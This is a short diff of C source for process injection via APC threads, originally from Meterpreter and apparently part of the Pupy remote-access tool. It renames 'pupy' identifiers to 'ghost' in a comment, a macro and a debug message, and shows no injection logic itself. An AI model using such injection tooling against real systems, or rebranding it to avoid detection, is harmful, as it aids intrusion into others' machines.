@@ -1,5 +1,5 @@
 /*
- This code is originally from meterpreter and has been modified to be integrated into pupy.
+ This code is originally from meterpreter and has been modified to be integrated into ghost.
  original code :https://github.com/rapid7/metasploit-payloads/blob/master/c/meterpreter/source/common/arch/win/i386/
 
 Meterpreter is available for use under the following license, commonly known as the
@@ -47,7 +47,7 @@ SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 #include "base_inject.h"
 #include "debug.h"
 
-#ifdef _PUPY_DYNLOAD
+#ifdef _GHOST_DYNLOAD
 #include <Python.h>
 #else
 #include "Python-dynload.h"
@@ -293,7 +293,7 @@ DWORD inject_via_apcthread( HANDLE hProcess, DWORD dwProcessID, DWORD dwDestinat
         lpRemoteApcContext = ( (BYTE *)lpRemoteApcStub + dwApcStubLength );
 
         dprint(
-            "[INJECT] -- dwPupyArch=%s, lpRemoteApcStub=0x%08X, lpRemoteApcContext=0x%08X\n",
+            "[INJECT] -- dwGhostArch=%s, lpRemoteApcStub=0x%08X, lpRemoteApcContext=0x%08X\n",
 #ifdef _WIN64
             "x64",
 #else
